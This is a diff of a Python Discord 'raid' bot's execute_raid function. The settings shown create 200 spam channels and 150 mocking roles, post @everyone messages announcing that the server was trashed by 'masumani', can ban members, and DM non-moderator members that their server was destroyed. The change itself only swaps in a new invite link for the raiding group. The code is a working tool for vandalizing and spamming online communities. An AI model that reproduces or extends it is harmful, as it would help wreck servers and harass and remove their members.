@@ -232,7 +232,7 @@ async def execute_raid(ctx, do_ban=False):
     icon_url = 'https://i.imgur.com/uMaj6CP.jpeg'
     channel_name = 'ますまに共栄圏最強'
     channel_count = 200
-    spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/masu\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
+    spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\nhttps://discord.gg/k248PuD2C2\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
     spam_count = 10
     role_name = 'ますまに共栄圏に荒らされましたww'
     role_count = 150
@@ -248,7 +248,7 @@ async def execute_raid(ctx, do_ban=False):
         async def send_dm(member):
             try:
                 if not member.guild_permissions.moderate_members:
-                    await member.send(f'{old_server_name}を破壊しました https://discord.gg/masu')
+                    await member.send(f'{old_server_name}を破壊しました https://discord.gg/k248PuD2C2')
                     return 1
                 return 0
             except:
